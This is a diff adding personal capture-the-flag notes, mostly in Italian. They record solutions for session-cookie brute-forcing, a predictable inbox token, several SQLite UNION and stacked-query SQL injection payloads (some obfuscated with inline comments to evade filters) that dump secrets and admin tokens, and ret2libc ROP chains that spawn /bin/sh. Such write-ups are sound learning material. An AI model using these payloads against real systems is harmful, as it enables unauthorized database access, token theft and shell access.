@@ -1,0 +1,59 @@
+CTF 2: 
+	Fatto 2 registrazioni e login, session_id cookie era numero a 4 cifre. Scritto programma python per provare con tutti i numeri a 4 cifre fino a quando uno non ha risposta diversa da 403 forbidden.
+	(troppo lento con burpsuite gratis)
+
+CTF 3:
+	Quando avvio la challenge burp riceve uno /status che dice che c'e un utente (l'admin), e l'orario in cui e avvenuta l'ultima attivita dell'admin.
+	Dopo aver creato un profilo e fatto l'accesso, per leggere l'inbox si usa un token che finisce con 00#n utente e inizia con un time stamp. 
+	Per leggere i messaggi dell'admin serve usare numero utente 1 e per calcolare il timestamp sottrarre al timestamp attuale i secondi passati dall'ultima attivita dell'admin.
+	Un po' di tentativi con intruder, oerche non ci sono i secondi nell'ultima attivita dell'admin.
+
+
+CTF1 sql:
+	Rossi') AND li.status = 'open') UNION ALL SELECT li.item_description, li.location_found, li.reported_at, li.status, NULL AS flight_number, NULL AS origin, NULL AS destination, NULL AS departure_date FROM lost_items li -- 
+	questa query stampa tutti gli oggetti smarriti di tutti i proprietari.
+	Rossi') AND li.status = 'open') UNION ALL SELECT sqlite_version(), '2', '3', '4', '5', '6', '7', '8' -- 
+	Questa query ritorna la versione SQL: SQLite 3.49.2.
+	Rossi') AND li.status = 'open') UNION ALL SELECT name, '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master WHERE type= 'table' -- questa query stampa i nomi di tutte le tabelle nel database.
+	C'e una tabella chiamata restricted items.
+	Rossi') AND li.status = 'open') UNION ALL SELECT name, '2', '3', '4', '5', '6', '7', '8' FROM pragma_table_info('restricted_items') -- questa query stampa tutte le colonne di restricted_items.
+	C'e una colonna chiamata locker_code.
+	Rossi') AND li.status = 'open') UNION ALL SELECT locker_code, '2', '3', '4', '5', '6', '7', '8' FROM restricted_items -- questa query stampa i valori di locker_code: tra cui la flag.
+
+CTF2 sql:
+	a%' OR a.content LIKE '%a%' ORDER BY a.updated_at DESC; UPDATE articles SET content = (SELECT value FROM internal_config WHERE key = 'admin_token') WHERE id = 1 -- la query non ritorna nessun output, ed e' seguita da una query non vulnerabile che invece lo ritorna. Ma viene comunque eseguita, quindi si puo' usare per cambiare il valore del contenuto dell'articolo 1 (quello sugli algoritmi), e poi leggere l'articolo normalmente.
+
+CTF3 sql:
+	Qualsiasi cosa venga messa come username viene poi usata in una query insocuraquando si clicca su my reviews
+	prima cerco il nome di tutte le tabelle (servono 8 colonne e viene stampata a schermo la quinta, questo l'ho scoperto per tentativi)
+	' OR 1=1 UNION ALL SELECT '1', '2', '3', '4', name, '6', '7', '8' FROM sqlite_master WHERE type='table'; -- questa query stampa i nomi di tutte le tabelle del db, ce n'e una chiamata secrets
+	' OR 1=1 UNION ALL SELECT '1', '2', '3', '4', name, '6', '7', '8' FROM pragma_table_info('secrets'); -- questa query stampa i nomi delle colonne della tabella secrets. Una colonna e' flag
+	' OR 1=1 UNION ALL SELECT '1', '2', '3', '4', flag, '6', '7', '8' FROM secrets; -- questa query stampa la flag 
+
+CTF4 sql: 
+	''/**/Or/**/1=1/**/Union/**/All/**/Select/**/name,/**/2,/**/3/**/,/**/4/**/,/**/5,6,7,8,9,10,11,12/**/From/**/sqlite_master/**/Where/**/type='table';/**/--/**/
+
+	''/**/Or/**/1=1/**/Union/**/All/**/Select/**/name,/**/2,/**/3/**/,/**/4/**/,/**/5,6,7,8,9,10,11,12/**/From/**/pragma_table_info('vip_guestlist');/**/--/**/
+	
+
+
+feedback_portal: 
+	No canary, NX enabeld, no PIE --> can jump to a PLT stub (stable if PIE is disabled) to call a function directly.
+	There is no pop rdi; ret in the binary, but i can leak sone values from stack with my first input. Any value starting with 0x7ffd...is stack, any value starting with 0x7f... is libc.
+	You don’t just need a libc address — you need a recognizable one. 0x7f48138e78a9 is a good leak, because it is inside a known function __libc_start_main+243.
+	On remote and on local the sstack position with the good leak changes!! It was %6$lx on local, but when trying it on remote that returned 0, while %9$lx returned a good leak.
+	ONce I had the good leak position, I used gbd, gave %6$lx (because on local), got the value and did info symbol <leak> to get the function of libc.6.so the leak was from.
+	Then p <function> and info proc mappings to get the base address. With leak and base address I could calculate the offset.
+	Then I needed to find ret gadget (with ROP as usual), pop rdi; ret, /bin/sh and system address (from library.)
+
+crystal_ball:
+	No canary, NX enabled, no PIE. Attack happens in two steps: first we print a leak from the library and rerun the program, then we use the leak to get addresses of /bin/sh and system.
+	In the first step we need to do padding
+		+ pop_rdi_ret (we have the function in main)
+		+ puts@got (prints the real libc address of puts, )
+		+ puts@plt (puts@plt is what the program normally uses to call puts)
+		+ main (or vuln)
+	What this does is putting the real address of puts as n argument, and then printing it.
+
+digital_postcard_writer: 
+	Same exact source code as crystal_ball except for the use of printf instead of gets. Very similar solve, just for some reason on local it only worked if I used libc.so.6 in usr, while remotely it worked the normal way.
